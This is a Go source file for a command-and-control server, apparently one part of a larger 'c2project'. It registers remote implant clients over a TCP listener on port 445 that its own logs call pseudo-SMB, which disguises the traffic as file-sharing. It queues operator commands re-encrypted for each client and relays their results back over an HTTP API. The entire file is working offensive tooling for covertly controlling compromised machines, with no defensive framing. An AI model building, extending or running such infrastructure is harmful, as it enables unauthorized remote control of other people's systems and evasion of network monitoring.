package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"sync"
	"time"

	"c2project/shared"
)

type Client struct {
	ID       string
	Hostname string
	OS       string
	LastSeen time.Time
}

type Task struct {
	ID       string
	ClientID string
	Command  []byte
	Result   []byte
	Status   string
}

type Store struct {
	mu      sync.Mutex
	clients map[string]*Client
	tasks   map[string]*Task
	queues  map[string][]string
}

func NewStore() *Store {
	return &Store{
		clients: make(map[string]*Client),
		tasks:   make(map[string]*Task),
		queues:  make(map[string][]string),
	}
}

var store = NewStore()

func handleSubmit(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var raw map[string]string
	if err := json.NewDecoder(r.Body).Decode(&raw); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	clientID := raw["client_id"]
	encB64 := raw["command"]

	store.mu.Lock()
	if _, ok := store.clients[clientID]; !ok {
		store.mu.Unlock()
		http.Error(w, "unknown client", http.StatusNotFound)
		return
	}

	encCommand, err := base64.StdEncoding.DecodeString(encB64)
	if err != nil {
		store.mu.Unlock()
		http.Error(w, "bad base64", http.StatusBadRequest)
		return
	}
	plainCommand, err := shared.Decrypt(shared.KeyTerminalToC2, encCommand)
	if err != nil {
		store.mu.Unlock()
		http.Error(w, "decrypt failed", http.StatusBadRequest)
		return
	}
	reencCommand, err := shared.Encrypt(shared.KeyC2ToClient, plainCommand)
	if err != nil {
		store.mu.Unlock()
		http.Error(w, "encrypt failed", http.StatusInternalServerError)
		return
	}

	taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
	task := &Task{
		ID:       taskID,
		ClientID: clientID,
		Command:  reencCommand,
		Status:   shared.StatusPending,
	}
	store.tasks[taskID] = task
	store.queues[clientID] = append(store.queues[clientID], taskID)
	store.mu.Unlock()

	log.Printf("[C2] Задача %s для клиента %s: %s", taskID, clientID, string(plainCommand))

	resp := shared.SubmitResponse{TaskID: taskID}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func handleStatus(w http.ResponseWriter, r *http.Request) {
	taskID := r.URL.Query().Get("id")
	if taskID == "" {
		http.Error(w, "missing id", http.StatusBadRequest)
		return
	}
	store.mu.Lock()
	task, ok := store.tasks[taskID]
	store.mu.Unlock()
	if !ok {
		http.Error(w, "task not found", http.StatusNotFound)
		return
	}

	resp := shared.StatusResponse{
		TaskID: task.ID,
		Status: task.Status,
	}
	if task.Status == shared.StatusDone && len(task.Result) > 0 {
		plain, err := shared.Decrypt(shared.KeyC2ToClient, task.Result)
		if err == nil {
			reenc, err2 := shared.Encrypt(shared.KeyTerminalToC2, plain)
			if err2 == nil {
				resp.Result = base64.StdEncoding.EncodeToString(reenc)
			}
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func handleClients(w http.ResponseWriter, r *http.Request) {
	store.mu.Lock()
	list := make([]shared.ClientInfo, 0, len(store.clients))
	for _, c := range store.clients {
		list = append(list, shared.ClientInfo{
			ClientID: c.ID,
			Hostname: c.Hostname,
			OS:       c.OS,
			LastSeen: c.LastSeen.Format(time.RFC3339),
		})
	}
	store.mu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(list)
}

func handleClient(conn net.Conn) {
	defer conn.Close()
	log.Printf("[C2] Новое TCP-соединение от %s", conn.RemoteAddr())

	pkt, err := shared.ReadPacket(conn)
	if err != nil {
		log.Printf("[C2] Ошибка чтения: %v", err)
		return
	}

	if pkt.Command != shared.CmdRegister {
		log.Printf("[C2] Неизвестная команда регистрации: %x", pkt.Command)
		return
	}

	regData, err := shared.Decrypt(shared.KeyC2ToClient, pkt.Payload)
	if err != nil {
		log.Printf("[C2] Ошибка расшифровки регистрации: %v", err)
		return
	}
	parts := splitRegistration(string(regData))
	if len(parts) < 1 {
		log.Printf("[C2] Некорректные данные регистрации")
		return
	}
	clientID := parts[0]

	store.mu.Lock()
	client, ok := store.clients[clientID]
	if !ok {
		client = &Client{ID: clientID}
		store.clients[clientID] = client
	}
	if len(parts) > 1 {
		client.Hostname = parts[1]
	}
	if len(parts) > 2 {
		client.OS = parts[2]
	}
	client.LastSeen = time.Now()
	store.mu.Unlock()

	log.Printf("[C2] Клиент зарегистрирован: ID=%s Host=%s OS=%s", clientID, client.Hostname, client.OS)

	ack := &shared.Packet{
		Command:   shared.CmdRegisterAck,
		SessionID: pkt.SessionID,
		MessageID: pkt.MessageID,
	}
	conn.Write(ack.Serialize())

	for {
		pkt, err := shared.ReadPacket(conn)
		if err != nil {
			log.Printf("[C2] Клиент %s отключился: %v", clientID, err)
			return
		}

		switch pkt.Command {
		case shared.CmdGetTask:
			store.mu.Lock()
			queue := store.queues[clientID]
			var task *Task
			if len(queue) > 0 {
				taskID := queue[0]
				store.queues[clientID] = queue[1:]
				task = store.tasks[taskID]
			}
			store.mu.Unlock()

			resp := &shared.Packet{
				Command:   shared.CmdTaskData,
				MessageID: pkt.MessageID,
			}
			if task != nil {
				resp.Payload = task.Command
				resp.TreeID = 1
				log.Printf("[C2] Отправлена задача %s клиенту %s", task.ID, clientID)
			}
			conn.Write(resp.Serialize())

		case shared.CmdSendResult:
			store.mu.Lock()
			for _, task := range store.tasks {
				if task.ClientID == clientID && task.Status == shared.StatusPending {
					task.Result = pkt.Payload
					task.Status = shared.StatusDone
					log.Printf("[C2] Получен результат для задачи %s", task.ID)
					break
				}
			}
			store.mu.Unlock()

			ack := &shared.Packet{
				Command:   shared.CmdResultAck,
				MessageID: pkt.MessageID,
			}
			conn.Write(ack.Serialize())
		}
	}
}

func splitRegistration(s string) []string {
	var parts []string
	cur := ""
	for _, ch := range s {
		if ch == '|' {
			parts = append(parts, cur)
			cur = ""
		} else {
			cur += string(ch)
		}
	}
	if cur != "" {
		parts = append(parts, cur)
	}
	return parts
}

func main() {
	http.HandleFunc(shared.EndpointSubmit, handleSubmit)
	http.HandleFunc(shared.EndpointStatus, handleStatus)
	http.HandleFunc(shared.EndpointList, handleClients)

	go func() {
		log.Println("[C2] HTTP-сервер запущен на :8080")
		if err := http.ListenAndServe(":8080", nil); err != nil {
			log.Fatal(err)
		}
	}()

	listener, err := net.Listen("tcp", ":445")
	if err != nil {
		log.Fatalf("[C2] Не удалось занять порт 445: %v", err)
	}
	log.Println("[C2] TCP-сервер (псевдо-SMB) запущен на :445")

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("[C2] Ошибка accept: %v", err)
			continue
		}
		go handleClient(conn)
	}
}